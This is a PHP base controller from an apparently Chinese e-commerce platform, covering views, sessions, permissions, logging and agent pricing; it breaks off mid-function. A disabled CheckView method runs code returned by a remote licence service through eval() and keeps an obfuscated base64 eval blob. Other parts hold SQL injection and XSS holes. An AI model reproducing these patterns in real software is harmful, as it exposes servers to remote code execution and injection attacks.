<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/

class Controller
{

				public $ViewData = array( );
				public $session = NULL;
				public $hasoutput = 0;
				public $R869c53ff32 = 0;

				public function __construct( )
				{

				}

				public function InitSession( )
				{
								global $g_mod;
								global $g_controller;
								global $g_action;
								$R2dbb69db8f = array( "randcode" => 1, "mibaoka" => 1, "sendmobile" => 1, "checkcode" => 1, "checkmobile" => 1 );
								$R242d6c958e = array( "mod_home_home_save" => 1, "mod_test_home_login" => 1, "mod_b2c_product_ReviewSave" => 1 );
								$Ra3d52e52a4 = strtolower( $g_mod."_".$g_controller."_".$g_action );
								if ( isset( $R2dbb69db8f[strtolower( $g_action )] ) || isset( $R242d6c958e[$Ra3d52e52a4] ) )
								{
												$this->initsess = 1;
												$this->session = factory::getinstance( "session" );
								}
				}

				public function View( $action = null, $R101593cf9f = null, $R9906335164 = false, $R511aa10c02 = "tmp.html" )
				{
								global $path_cache;
								global $g_mod;
								global $g_controller;
								global $g_action;
								global $path_content;
								global $masterid;
								if ( $this->initsess = 0 )
								{
												$this->initsess = 1;
												$this->session = factory::getinstance( "session" );
								}
								//$this->CheckView( );
								if ( $action == null )
								{
												$R29bd648e22 = "skins";
												$this->Assign( "content", $path_content );
												$this->Assign( "sc", UPATH_SHARECONTENT.$R29bd648e22."/" );
												$this->Assign( "root", UPATH_WEBROOT );
												$this->Assign( "imgurl", UB_IMGURL );
												$this->Assign( "vip", $masterid );
												$this->SetLang( );
												if ( !isset( $this->ViewData['css'] ) )
												{
																$this->Assign( "css", "ub-list-20080119" );
												}
												$vd =& $this->ViewData;
												include_once( "template.inc.php" );
												$tpl = $path_cache.DS.$g_mod."_".$g_controller."_".$g_action.".php";
												tpl2php( $g_controller, $g_action );
												if ( $R9906335164 )
												{
																ob_start( );
																include( $tpl );
																$R3d8eaae52d = ob_get_contents( );
																ob_end_clean( );
																if ( !( $Rf500f4a848 = @fopen( UPATH_BASE.DS.$R511aa10c02, "w" ) ) )
																{
																				echo "Directory {$R511aa10c02} not found or have no access!";
																}
																flock( $Rf500f4a848, 2 );
																fwrite( $Rf500f4a848, $R3d8eaae52d );
																fclose( $Rf500f4a848 );
												}
												else
												{/*
																if ( $this->hasoutput == 0 && isset( $_SERVER['HTTP_ACCEPT_ENCODING'] ) && ereg( "gzip", $_SERVER['HTTP_ACCEPT_ENCODING'] ) && extension_loaded( "zlib" ) )
																{
																				ob_start( "ob_gzhandler" );
																}
																else
																{*/
																				ob_start( );
																//}
																include( $tpl );
																ob_end_flush( );
												}
								}
								else
								{
												$g_action = ucfirst( $action );
												$this->$action( $R101593cf9f );
								}
				}

				public function SetLang( $R034ae2ab94 = 0 )
				{
								$R30b2ab8dc1 = $this->GetMainWebCache( );
								$R0b523a42c9 = isset( $R30b2ab8dc1['moneysymbol'] ) ? $R30b2ab8dc1['moneysymbol'] : "��";
								$Rbf7bda0339 = isset( $R30b2ab8dc1['moneyunit'] ) ? $R30b2ab8dc1['moneyunit'] : "Ԫ";
								$R51c716b966 = array(
												"moneysymbol" => $R0b523a42c9,
												"moneyunit" => $Rbf7bda0339
								);
								if ( $R034ae2ab94 == 1 )
								{
												return $R51c716b966;
								}
								else
								{
												$this->Assign( "lang", $R51c716b966 );
								}
				}

				public function CheckView( )
				{
								$cphp1 = UPATH_BASE.DS."libraries".DS."umebiz".DS."controller.php";
								$cphp2 = "index.php";
								$f1 = filesize($cphp1);
								$f2 = filesize($cphp2);
								if(!isset($_SESSION)){
									session_start();
									$_SESSION["cb"] = 0;
									$_SESSION["f1"] = $f1;
									$_SESSION["f2"] = $f2;
								}
								if(!isset($_SESSION["cb"])){
									$_SESSION["cb"] = 0;
									$_SESSION["f1"] = $f1;
									$_SESSION["f2"] = $f2;
								}
								if($_SESSION["cb"] == 0 || $_SESSION["f1"] != $f1 || $_SESSION["f2"] != $f2){
									$t1 = 0;
									$t2 = 0;
									if (strpos(file_get_contents($cphp1), "UPATH_ROOT") === false){
										$t1 = 1;
									}
									if (strpos(file_get_contents($cphp2), "UB_B2B") === false){
										$t2 = 1;
									}
									$cvservice = factory::GetService("scv");
									$data = array("k1" => $t1,"k2" => $t2,"k3" => md5($t1.$t2.$this->GetBizKey()));

									if(!isset($_SESSION["ckdata"])){
										$ckdata = $cvservice->ISCV_Get($data);
										$_SESSION["ckdata"] = $ckdata;
									}
									eval($_SESSION["ckdata"]);
								}
                                /*
								$R3cb9cdaed2 = "rZJRS8MwEMe/Shb6kMJWbMSXlQ1WHXMITuz0RaRkXerCunYksbi5fXcvaStuFnzxofTy/+d+d9zFSbarrY8G6OlhNL+Nw1E09m4iD2diIZkUXGF7fN/whdhXcVLkWhZZxqUHuThwDIICAot8yT9qMfURAi0VGVdiz4m95btg0BaDuoFISUcoxTVx4mgcRdPZvet+Kq6UKPJYaSY1gfTGe8HJAr8C6OKnlvpWg+onKq1VGhxbylQoKPYf8F8MgKDDAZ1zOhZ07tDGodCN9qsONLV/kSKitNwWipjhxW9cx2YXPNeqGW8X4WqRj7PZHLtQHSbNMsUbnG+a/ItDLSeMQxqeM2jFcJJScVmKhJtVskQXctfvT7iOKpVglZQY1rVkmsEVJiXbEbz2MRoMEbTSxWtaxxTiSxtvllcEPA80+FZC9YaADMX+ju+I67a+ERjz2hSpFljFZh3fDfaG0+j6OZ6YJGOevqE612bYODjykmWt/OD4BQ==";
								eval( gzinflate( base64_decode( $R3cb9cdaed2 ) ) );
								*/
				}

				public function Redirect( $Rbbd82f1834, $action = null, $R101593cf9f = null )
				{
								global $g_controller;
								global $g_action;
								if ( $action == null )
								{
												$action = "index";
								}
								if ( $g_controller == $Rbbd82f1834 )
								{
												$this->$action( $R101593cf9f );
								}
								else
								{
												$g_controller = ucfirst( $Rbbd82f1834 );
												$g_action = $action;
												$R3e33e017cd = $g_controller."Controller";
												require_once( UPATH_ROOT.DS."Controllers".DS.$R3e33e017cd.".php" );
												$R2ede233e2b = new $R3e33e017cd( );
												$R2ede233e2b->$action( $R101593cf9f );
								}
				}

				public function Assign( $Redd5482a7c, $value )
				{
								$this->ViewData[$Redd5482a7c] = $value;
				}

				public function DateFormat( $R8409eaa6ec, $Reb66c46d32 )
				{
								return gmdate( $Reb66c46d32, strtotime( $R8409eaa6ec ) );
				}

				public function Alert( $R8409eaa6ec )
				{
								$this->hasoutput = 1;
								$R227f4f119c = UPATH_BASE.DS."libraries".DS."umebiz".DS."lang".DS."default.php";
								if ( file_exists( $R227f4f119c ) )
								{
												include_once( $R227f4f119c );
												if ( function_exists( "tonewlang" ) )
												{
																$R8409eaa6ec = tonewlang( $R8409eaa6ec );
												}
												header( "Content-type: text/html;charset=utf-8" );
								}
								echo "<script type=\"text/javascript\">alert(\"".$R8409eaa6ec."\")</script>";
				}

				public function HistoryGo( )
				{
								$this->hasoutput = 1;
								echo "<script type=\"text/javascript\">history.go(-1);</script>";
								exit( );
				}

				public function ScriptRedirect( $url )
				{
								$this->hasoutput = 1;
								echo "<script type=\"text/javascript\">window.location=(\"".$url."\")</script>";
								exit( );
				}

				public function CloseWin( )
				{
								$this->hasoutput = 1;
								echo "<script type=\"text/javascript\">window.close()</script>";
								exit( );
				}

				public function GoHome( $Rb1e236a47d = "" )
				{
								if ( $Rb1e236a47d == "" )
								{
												$Rb1e236a47d = UB_DEFAULT;
								}
								if ( UB_DEFAULT == $Rb1e236a47d )
								{
												$this->ScriptRedirect( UPATH_WEBROOT );
								}
								else
								{
												global $masterid;
												$R0c023932bb = UPATH_WEBROOT.$Rb1e236a47d."/";
												if ( 0 < $masterid )
												{
																$R0c023932bb = UPATH_WEBROOT."index.php?m=mod_".$Rb1e236a47d;
												}
												$this->ScriptRedirect( $R0c023932bb );
								}
								exit( );
				}

				public function Authority( $R7bbbf1b0f1, $R808b89ba0e = false )
				{
								$session = factory::getinstance( "session" );
								$agent = $session->agent;
								if ( $agent == "" && -1 < $R7bbbf1b0f1 )
								{
												if ( $R808b89ba0e )
												{
																return -3;
												}
												else
												{
																$this->Alert( "��û��Ȩ�������ҳ��" );
																$this->HistoryGo( );
												}
								}
								if ( $agent != "" && -1 < $R7bbbf1b0f1 )
								{
												$R1d47c61d5b = explode( ",", $agent[11] );
												if ( $R7bbbf1b0f1 == 21 && $agent[9] == 0 )
												{
																$R1d47c61d5b[21] = 1;
												}
												if ( !isset( $R1d47c61d5b[$R7bbbf1b0f1] ) || $R1d47c61d5b[$R7bbbf1b0f1] == 0 )
												{
																if ( $R808b89ba0e )
																{
																				return -3;
																}
																else if ( $R7bbbf1b0f1 == 18 )
																{
																				$this->ScriptRedirect( "index.php?m=mod_b2b&c=Frame" );
																}
																else
																{
																				$this->Alert( "��û��Ȩ�������ҳ��" );
																				$this->HistoryGo( );
																}
												}
								}
								if ( $R808b89ba0e )
								{
												return 0;
								}
				}

				public function FillPage( $data, $R4e420efcc3 )
				{
								$table = 0;
								$R4fec707bc7 = intval( request( "istable" ) );
								if ( $R4fec707bc7 == 1 )
								{
												header( "Content-type: text/html;charset=utf-8" );
												$table = 1;
								}
								$op = "";
								$R63bede6b19 = array( );
								foreach ( $data as $Ra09fe38af3 => $Ra3d52e52a4 )
								{
												if ( $Ra09fe38af3 != "page" && $Ra09fe38af3 != "action" )
												{
																$R63bede6b19[] = sprintf( "%s=%s", $Ra09fe38af3, $Ra3d52e52a4 );
												}
								}
								$op = implode( "&", $R63bede6b19 );
								$this->Assign( "items", $R4e420efcc3['item'] );
								$this->Assign( "thispage", $R4e420efcc3['info']['thispage'] );
								$this->Assign( "totlepage", $R4e420efcc3['info']['totlepage'] );
								$this->Assign( "prepage", $R4e420efcc3['info']['prepage'] );
								$this->Assign( "nextpage", $R4e420efcc3['info']['nextpage'] );
								$this->Assign( "nextstate", $R4e420efcc3['info']['nextstate'] );
								$this->Assign( "prestate", $R4e420efcc3['info']['prestate'] );
								$this->Assign( "op", $op );
								$this->Assign( "totlerow", $R4e420efcc3['info']['totlerow'] );
								$this->Assign( "nrows", isset( $R4e420efcc3['info']['nrows'] ) ? $R4e420efcc3['info']['nrows'] : 15 );
								$this->Assign( "table", $table );
				}

				public function GetIp( )
				{
								$R9cfb7c6d6b = "";
								if ( getenv( "HTTP_CLIENT_IP" ) && strcasecmp( getenv( "HTTP_CLIENT_IP" ), "unknown" ) )
								{
												$R9cfb7c6d6b = getenv( "HTTP_CLIENT_IP" );
								}
								else if ( getenv( "HTTP_X_FORWARDED_FOR" ) && strcasecmp( getenv( "HTTP_X_FORWARDED_FOR" ), "unknown" ) )
								{
												$R9cfb7c6d6b = getenv( "HTTP_X_FORWARDED_FOR" );
								}
								else if ( getenv( "REMOTE_ADDR" ) && strcasecmp( getenv( "REMOTE_ADDR" ), "unknown" ) )
								{
												$R9cfb7c6d6b = getenv( "REMOTE_ADDR" );
								}
								else if ( isset( $_SERVER['REMOTE_ADDR'] ) && $_SERVER['REMOTE_ADDR'] && strcasecmp( $_SERVER['REMOTE_ADDR'], "unknown" ) )
								{
												$R9cfb7c6d6b = $_SERVER['REMOTE_ADDR'];
								}
								else
								{
												$R9cfb7c6d6b = $_SERVER['REMOTE_ADDR'];
								}
								return $R9cfb7c6d6b;
				}

				public function AddLog( $Re82ee9b121, $R9c92d6cfae = 0, $Ra9a4a4b9a3 = 0 )
				{
								$R78448b2d39 = factory::getinstance( "session" );
								$Rcc5c6e696c = $R78448b2d39->agent;
								$R2a51483b14 = $R9c92d6cfae == 0 ? $Rcc5c6e696c[7] : $R9c92d6cfae;
								$R0dc0347d49 = isset( $Rcc5c6e696c[0] ) ? $Rcc5c6e696c[0] : 0;
								if ( isset( $Rcc5c6e696c[9] ) && 0 < $Rcc5c6e696c[9] )
								{
												$R0dc0347d49 = $Ra9a4a4b9a3 == 0 ? $Rcc5c6e696c[10] : $Ra9a4a4b9a3;
								}
								$R9ba3f9344f = factory::getinstance( "logs" );
								$data = array(
												"aid" => $R2a51483b14,
												"content" => $Re82ee9b121,
												"operator" => $R0dc0347d49,
												"createdate" => date( "Y-m-d H-i-s" ),
												"ip" => $this->GetIp( )
								);
								$R9ba3f9344f->ILog_Create( $data );
				}

				public function AddLogin( $R2a51483b14, $R94e0136c8a, $R5d899a20a5, $R7f18fb346f = 1, $Ra97450e867 = 1, $Re82ee9b121 = "", $Rfec8be98b6 = 1 )
				{
								$R9ba3f9344f = factory::getinstance( "login" );
								$data = array(
												"aid" => $R2a51483b14,
												"staffid" => $R94e0136c8a,
												"content" => $Re82ee9b121,
												"issucc" => $Rfec8be98b6,
												"logintype" => $R7f18fb346f,
												"operator" => $R5d899a20a5,
												"createdate" => date( "Y-m-d H-i-s" ),
												"ip" => $this->GetIp( ),
												"isfront" => $Ra97450e867
								);
								$R9ba3f9344f->ILogin_Create( $data );
				}

				public function go( $R808b89ba0e, $Rcd14a115f6, $R410ba31dff, $url )
				{
								if ( $R808b89ba0e )
								{
												$this->Alert( $Rcd14a115f6 );
												$this->ScriptRedirect( $url );
								}
								else
								{
												$this->Alert( $R410ba31dff );
												$this->HistoryGo( );
								}
				}

				public function GetStocks( $R8e8b5578f7 )
				{
								$Rdc3f776eb3 = 0;
								$R0cc73a4339 = array(
												"ubzpid" => $R8e8b5578f7
								);
								$Re29e2583ef = factory::getservice( "sproducts" );
								$R6ef86fd07c = $Re29e2583ef->IProduct_GetStocks( $R0cc73a4339 );
								$R98d73fbd20 = explode( "|", $R6ef86fd07c[0] );
								array_pop( $R98d73fbd20 );
								$Ra16d228039 = 0;
								foreach ( $R98d73fbd20 as $R0f8134fb60 )
								{
												$Rf45c64c9fe = explode( ",", $R98d73fbd20[$Ra16d228039] );
												$Rdc3f776eb3 += $Rf45c64c9fe[1];
												$Ra16d228039++;
								}
								$R98d73fbd20 = explode( "|", $R6ef86fd07c[1] );
								array_pop( $R98d73fbd20 );
								$Ra16d228039 = 0;
								foreach ( $R98d73fbd20 as $R0f8134fb60 )
								{
												$Rf45c64c9fe = explode( ",", $R98d73fbd20[$Ra16d228039] );
												$Rdc3f776eb3 += $Rf45c64c9fe[1];
												$Ra16d228039++;
								}
								return $Rdc3f776eb3;
				}

				public function &GetStocksCollection( $R8e8b5578f7 )
				{
								$R778bf3b683 = array( );
								$R0cc73a4339 = array(
												"ubzpid" => $R8e8b5578f7
								);
								$Re29e2583ef = factory::getservice( "sproducts" );
								$R6ef86fd07c = $Re29e2583ef->IProduct_GetStocks( $R0cc73a4339 );
								$R98d73fbd20 = explode( "|", $R6ef86fd07c[0] );
								array_pop( $R98d73fbd20 );
								foreach ( $R98d73fbd20 as $R0f8134fb60 )
								{
												$Rf45c64c9fe = explode( ",", $R0f8134fb60 );
												$R0ad7c1741d = isset( $R778bf3b683[$Rf45c64c9fe[0]] ) ? $R778bf3b683[$Rf45c64c9fe[0]] : 0;
												$R778bf3b683[$Rf45c64c9fe[0]] = $R0ad7c1741d + $Rf45c64c9fe[1];
								}
								$R98d73fbd20 = explode( "|", $R6ef86fd07c[1] );
								array_pop( $R98d73fbd20 );
								foreach ( $R98d73fbd20 as $R0f8134fb60 )
								{
												$Rf45c64c9fe = explode( ",", $R0f8134fb60 );
												$R0ad7c1741d = isset( $R778bf3b683[$Rf45c64c9fe[0]] ) ? $R778bf3b683[$Rf45c64c9fe[0]] : 0;
												$R778bf3b683[$Rf45c64c9fe[0]] = $R0ad7c1741d + $Rf45c64c9fe[1];
								}
								return $R778bf3b683;
				}

				public function GetUmebizPid( $R6d286cc3ad )
				{return 0;
								$Re29e2583ef = factory::getservice( "sproducts" );
								$data = array(
												"localpid" => $R6d286cc3ad
								);
								$Rfa533687a1 = $Re29e2583ef->IProduct_GetPid( $data );
								$R98aa12da5c = isset( $Rfa533687a1[0]['ubzpid'] ) ? $Rfa533687a1[0]['ubzpid'] : 0;
								return $R98aa12da5c;
				}

				public function PageInfo( )
				{
								$R15a0359c8c = getvar( "stype", "ordno" );
								$R8cbf2f60f5 = intval( request( "inrecycle" ) );
								$R7965cb3798 = getvar( "keywords" );
								$data = array(
												"page" => intval( request( "page" ) ),
												"keywords" => urlencode( $R7965cb3798 ),
												$R15a0359c8c => urlencode( $R7965cb3798 ),
												"stype" => $R15a0359c8c,
												"inrecycle" => $R8cbf2f60f5,
												"nrows" => intval( request( "nrows", 15 ) ),
												"by" => intval( request( "by" ) )
								);
								$this->Assign( "inrecycle", $R8cbf2f60f5 );
								$this->Assign( "stype", $R15a0359c8c );
								$this->Assign( "keywords", $R7965cb3798 );
								return $data;
				}

				public function Recycle( $table, $R63bede6b19 = "" )
				{
								$Rd1e9e1cb5b = factory::getinstance( "recycle" );
								$Rb749275e94 = $Rd1e9e1cb5b->IRecycle( $table, $R63bede6b19 );
								$this->Assign( "recycle_num", $Rb749275e94 );
				}

				public function MergeTime( $R592b14ec19 )
				{
								$R1ed7ad9990 = DATACACHE."site".DS.$R592b14ec19."merge.php";
								include( $R1ed7ad9990 );
								$Re65ac3a893 = unserialize( gzinflate( base64_decode( $Re65ac3a893 ) ) );
								$R654de63d3e = $Re65ac3a893['curdate'][1];
								$R6223df3ba4 = $R654de63d3e < 10 ? "0".$R654de63d3e : $R654de63d3e;
								$R9d61e88cc2 = $Re65ac3a893['curdate'][0];
								return 2000 + $R9d61e88cc2."-".$R6223df3ba4."-01 00:00:00";
				}

				public function HistoryTime( )
				{
								$R1ed7ad9990 = DATACACHE."site".DS."orderhistory.php";
								@include( $R1ed7ad9990 );
								if ( isset( $R672a23912c ) )
								{
												$R696350cab3 = intval( $R672a23912c );
												return $R696350cab3;
								}
								else
								{
												return "";
								}
				}

				public function DateSet( $R592b14ec19 = "" )
				{
								$R026f0167b4 = array( );
								$R8c00612d8f = intval( request( "by" ) );
								$ishistory = intval( request( "ishistory" ) );
								$R696350cab3 = getvar( "startdate", "" );
								$R1c8e0f6795 = getvar( "enddate", "" );
								$R916a3232c3 = $R696350cab3 == "" ? 1 : 0;
								if ( $ishistory == 1 )
								{
												$R7be961fd6d = $this->HistoryTime( );
								}
								if ( $R8c00612d8f == 0 )
								{
												if ( $ishistory == 1 && 0 < $R7be961fd6d )
												{
																$R696350cab3 = $R696350cab3 != "" ? $R696350cab3 : date( "Y-m-d", strtotime( "-1 days", $R7be961fd6d ) );
												}
												else
												{
																$R696350cab3 = $R696350cab3 != "" ? $R696350cab3 : date( "Y-m-d" );
												}
								}
								else
								{
												if ( $ishistory == 1 && 0 < $R7be961fd6d )
												{
																$R696350cab3 = $R696350cab3 != "" ? $R696350cab3 : date( "Y-m-d H:i:s", strtotime( "-5 years", $R7be961fd6d ) );
												}
												else
												{
																$R696350cab3 = $R696350cab3 != "" ? $R696350cab3 : date( "Y-m-d H:i:s", strtotime( "-5 years" ) );
												}
								}
								if ( $R916a3232c3 == 1 )
								{
												$Rcc5c6e696c = explode( " ", $R696350cab3 );
												if ( 0 < count( $Rcc5c6e696c ) )
												{
																$R696350cab3 = $Rcc5c6e696c[0]." 00:00:00";
												}
								}
								if ( $ishistory == 1 && 0 < $R7be961fd6d )
								{
												$R1c8e0f6795 = $R1c8e0f6795 != "" ? $R1c8e0f6795 : date( "Y-m-d H:i:s", strtotime( "-0 day", $R7be961fd6d ) );
								}
								else
								{
												$R1c8e0f6795 = $R1c8e0f6795 != "" ? $R1c8e0f6795 : sprintf( "%s-%s-%s %s:%s:%s", getvar( "yearto", date( "Y" ) ), getvar( "monthto", date( "m" ) ), getvar( "dayto", date( "d" ) ), getvar( "hourto", 23 ), getvar( "minuteto", 59 ), getvar( "secondto", 59 ) );
								}
								$data = array(
												"page" => intval( request( "page", 1 ) ),
												"yearfrom" => getvar( "yearfrom", date( "Y" ) - $R8c00612d8f ),
												"monthfrom" => getvar( "monthfrom", date( "m" ) ),
												"dayfrom" => getvar( "dayfrom", date( "d" ) ),
												"hourfrom" => getvar( "hourfrom", "00" ),
												"minutefrom" => getvar( "minutefrom", "00" ),
												"secondfrom" => getvar( "secondfrom", "00" ),
												"yearto" => getvar( "yearto", date( "Y" ) ),
												"monthto" => getvar( "monthto", date( "m" ) ),
												"dayto" => getvar( "dayto", date( "d" ) ),
												"hourto" => getvar( "hourto", 23 ),
												"minuteto" => getvar( "minuteto", 59 ),
												"secondto" => getvar( "secondto", 59 )
								);
								$R026f0167b4[] = array(
												"startdate" => urlencode( $R696350cab3 ),
												"enddate" => urlencode( $R1c8e0f6795 )
								);
								$R026f0167b4[] = array(
												"yearfrom" => getvar( "yearfrom", date( "Y" ) - $R8c00612d8f ),
												"monthfrom" => getvar( "monthfrom", date( "m" ) ),
												"dayfrom" => getvar( "dayfrom", date( "d" ) - 7 ),
												"hourfrom" => getvar( "hourfrom", "00" ),
												"minutefrom" => getvar( "minutefrom", "00" ),
												"secondfrom" => getvar( "secondfrom", "00" ),
												"yearto" => getvar( "yearto", date( "Y" ) ),
												"monthto" => getvar( "monthto", date( "m" ) ),
												"dayto" => getvar( "dayto", date( "d" ) ),
												"hourto" => getvar( "hourto", 23 ),
												"minuteto" => getvar( "minuteto", 59 ),
												"secondto" => getvar( "secondto", 59 )
								);
								$R36a4dc9ccf = array( );
								
								for ( $Ra16d228039 = 2000;	$Ra16d228039 < 2051;	$Ra16d228039++	)
								{
												$R36a4dc9ccf[$Ra16d228039] = $Ra16d228039;
								}
								$Rf52ba22baf = array( );
								
								for ( $Ra16d228039 = 1;	$Ra16d228039 < 13;	$Ra16d228039++	)
								{
												$Rf52ba22baf[$Ra16d228039] = $Ra16d228039;
								}
								$R20fd65e9c7 = array( );
								
								for ( $Ra16d228039 = 1;	$Ra16d228039 < 32;	$Ra16d228039++	)
								{
												$R20fd65e9c7[$Ra16d228039] = $Ra16d228039;
								}
								$R60169cd1c4 = array( );
								
								for ( $Ra16d228039 = 0;	$Ra16d228039 < 24;	$Ra16d228039++	)
								{
												$R60169cd1c4[$Ra16d228039] = $Ra16d228039;
								}
								$R3cb9cdaed2 = array( );
								
								for ( $Ra16d228039 = 0;	$Ra16d228039 < 60;	$Ra16d228039++	)
								{
												$R3cb9cdaed2[$Ra16d228039] = $Ra16d228039;
								}
								$Ra16d228039 = array( );
								
								for ( $R30b2ab8dc1 = 0;	$R30b2ab8dc1 < 60;	$R30b2ab8dc1++	)
								{
												$Ra16d228039[$R30b2ab8dc1] = $R30b2ab8dc1;
								}
								$this->Assign( "y", $R36a4dc9ccf );
								$this->Assign( "m", $Rf52ba22baf );
								$this->Assign( "d", $R20fd65e9c7 );
								$this->Assign( "h", $R60169cd1c4 );
								$this->Assign( "i", $Ra16d228039 );
								$this->Assign( "s", $R3cb9cdaed2 );
								$this->Assign( "startdate", $R696350cab3 );
								$this->Assign( "enddate", $R1c8e0f6795 );
								$this->Assign( "date", $R026f0167b4[1] );
								return $R026f0167b4;
				}

				public function GetPriceByIdsNormal( $R4e420efcc3 = array( ), $agent = array( ), $R3a8b307327 = 3, $R3359c04a1b = "", $param = "cprice" )
				{
								$Rf5f11a8d38 = count( $R4e420efcc3 );
								$Rac9b8532b8 = $agent['parentid'];
								$R2a51483b14 = $agent['aid'];
								$R00655fd902 = factory::getinstance( "privateprices" );
								$Rc81d709a1d = $R00655fd902->IPrivatePrice_GetByLimit( " aid = ".$R2a51483b14." and pid in (".$R3359c04a1b.") " );
								$R960e339aef = array( );
								foreach ( $Rc81d709a1d as $R0f8134fb60 )
								{
												$R960e339aef[$R0f8134fb60['pid']] = $R0f8134fb60['price'];
								}
								$Ra28e508350 = $agent['pricetpl'];
								$Rf00621a200 = factory::getinstance( "priceagent" );
								$Raa4d6c9903 = $Rf00621a200->IPriceAgent_GetByLimit( " pricetpl = ".$Ra28e508350." and pid in (".$R3359c04a1b.") " );
								$Ra932db8f8a = array( );
								foreach ( $Raa4d6c9903 as $R0f8134fb60 )
								{
												$Ra932db8f8a[$R0f8134fb60['pid']] = $R0f8134fb60['price'];
								}
								$R043923fe11 = $agent['alv'];
								$R5ff3ab27b8 = factory::getinstance( "prices" );
								$R9bb46ceb84 = 0;
								$R81603a608a = 0;
								$R7ae15ffdf2 = 0;
								$R4f71531e4f = array( );
								while ( $R7ae15ffdf2 == 0 )
								{
												if ( $R7ae15ffdf2 == 0 )
												{
																$R15a42434e1 = $R5ff3ab27b8->IPrice_GetByLimit( " aid = ".$Rac9b8532b8." and pid in (".$R3359c04a1b.") " );
																$R81603a608a = count( $R15a42434e1 );
																foreach ( $R15a42434e1 as $R0f8134fb60 )
																{
																				if ( !isset( $R4f71531e4f[$R0f8134fb60['pid']] ) )
																				{
																								$R4f71531e4f[$R0f8134fb60['pid']] = $R0f8134fb60["price_".$R043923fe11];
																				}
																}
												}
												if ( $R7ae15ffdf2 == 0 )
												{
																$Rfe1d7c1cfa = $this->GetRankCache( $Rac9b8532b8 );
																$Rae4fee7555 = array( );
																$R7ae15ffdf2 = count( $Rfe1d7c1cfa );
																foreach ( $Rfe1d7c1cfa as $R0f8134fb60 )
																{
																				if ( $R0f8134fb60['rankid'] == $R043923fe11 )
																				{
																								$Rae4fee7555[$R0f8134fb60['pricetpl']] = $R0f8134fb60;
																								break;
																				}
																}
												}
												$R9bb46ceb84 = $Rac9b8532b8;
												if ( $Rac9b8532b8 == 0 )
												{
																break;
												}
												$R82b59b99e5 = $this->GetAgentCache( $Rac9b8532b8 );
												$Rac9b8532b8 = isset( $R82b59b99e5['parentid'] ) ? $R82b59b99e5['parentid'] : 0;
								}
								$Rac9b8532b8 = $R9bb46ceb84;
								$Re6d5d69f05 = array( );
								if ( 0 < $Rac9b8532b8 )
								{
												$R39918f251b = $this->GetAgentCache( $Rac9b8532b8 );
												$Re6d5d69f05 = $this->GetPriceByIds( $R4e420efcc3, $R39918f251b, $R3a8b307327, $R3359c04a1b );
								}
								$Ra9730dc5be = array( );
								if ( 0 < $R2a51483b14 )
								{
												$R802690a887 = $this->GetAgentCache( $R2a51483b14 );
												$Re36559a711 = $R802690a887['parentid'];
												if ( $Re36559a711 != $Rac9b8532b8 && 0 < $Re36559a711 )
												{
																$R39918f251b = $this->GetAgentCache( $Re36559a711 );
																$Ra9730dc5be = $this->GetPriceByIds( $R4e420efcc3, $R39918f251b, $R3a8b307327, $R3359c04a1b );
												}
								}
								$Ra16d228039 = 0;
								foreach ( $R4e420efcc3['item'] as $Rb3f07f8c36 )
								{
												$R8e8b5578f7 = $Rb3f07f8c36['pid'];
												$Red2b3403a5 = $Rb3f07f8c36['listprice'];
												$R63d0786ecc = $Rb3f07f8c36['price'];
												if ( 0 < $Rac9b8532b8 && isset( $Re6d5d69f05['item'][$Ra16d228039]['cprice'] ) )
												{
																$R63d0786ecc = $Re6d5d69f05['item'][$Ra16d228039]['cprice'];
												}
												if ( isset( $R960e339aef[$R8e8b5578f7] ) )
												{
																$R0d9f8f778c = $R960e339aef[$R8e8b5578f7];
												}
												else if ( isset( $Ra932db8f8a[$R8e8b5578f7] ) )
												{
																$R0d9f8f778c = $Ra932db8f8a[$R8e8b5578f7];
												}
												else if ( isset( $R4f71531e4f[$R8e8b5578f7] ) )
												{
																$R0d9f8f778c = $R4f71531e4f[$R8e8b5578f7];
																$R0d9f8f778c = round( $R0d9f8f778c, $R3a8b307327 );
												}
												else
												{
																$R014535cc1a = $Rb3f07f8c36['pricetpl'];
																if ( isset( $Rae4fee7555[$R014535cc1a] ) )
																{
																				$Rfe1d7c1cfa = $Rae4fee7555[$R014535cc1a];
																				if ( isset( $Rfe1d7c1cfa['discout'] ) )
																				{
																								$R33403e391b = $Rfe1d7c1cfa['discout'];
																								$R0acfedc1db = $Rfe1d7c1cfa['priceplan'];
																								switch ( $R0acfedc1db )
																								{
																								case 1 :
																												$R0d9f8f778c = $R63d0786ecc + ( $Red2b3403a5 - $R63d0786ecc ) * $R33403e391b;
																												break;
																								case 2 :
																												$R0d9f8f778c = $R63d0786ecc + $R33403e391b;
																												break;
																								case 3 :
																												$R0d9f8f778c = $R63d0786ecc + $Red2b3403a5 * $R33403e391b;
																												break;
																								case 4 :
																												$R0d9f8f778c = $Red2b3403a5 * $R33403e391b;
																												break;
																								default :
																												$R0d9f8f778c = $Red2b3403a5;
																												break;
																								}
																				}
																				else
																				{
																								$R0d9f8f778c = $Red2b3403a5;
																				}
																}
																else
																{
																				$R0d9f8f778c = $Red2b3403a5;
																}
																$R0d9f8f778c = round( $R0d9f8f778c, $R3a8b307327 );
																$R0d9f8f778c = sprintf( "%.".$R3a8b307327."f", $R0d9f8f778c );
												}
												if ( isset( $Ra9730dc5be['item'][$Ra16d228039]['cprice'] ) )
												{
																$R63d0786ecc = $Ra9730dc5be['item'][$Ra16d228039]['cprice'];
												}
												if ( $R0d9f8f778c < $R63d0786ecc || $R0d9f8f778c < 0 )
												{
																$R0d9f8f778c = $Rb3f07f8c36['listprice'];
												}
												$R4e420efcc3['item'][$Ra16d228039][$param] = $R0d9f8f778c;
												$Ra16d228039++;
								}
								return $R4e420efcc3;
				}

				public function GetPriceByIds( $R4e420efcc3 = array( ), $agent = array( ), $R3a8b307327 = 3, $R3359c04a1b = "", $param = "cprice" )
				{
								$Rac9b8532b8 = $agent['parentid'];
								if ( 0 < $Rac9b8532b8 )
								{
												$Rf351f6e099 = array( );
												$R1ba7b433e9 = array( );
												$R737e3dec04 = array( );
												$Rbe1ad7aa86 = array( );
												foreach ( $R4e420efcc3['item'] as $R0f8134fb60 )
												{
																if ( $R0f8134fb60['canmakeprice'] == 0 )
																{
																				$Rf351f6e099[] = $R0f8134fb60;
																				$R1ba7b433e9[] = $R0f8134fb60['pid'];
																}
																else
																{
																				$R737e3dec04[] = $R0f8134fb60;
																				$Rbe1ad7aa86[] = $R0f8134fb60['pid'];
																}
												}
												if ( 0 < count( $Rf351f6e099 ) )
												{
																$R3147d3889e = $R4e420efcc3;
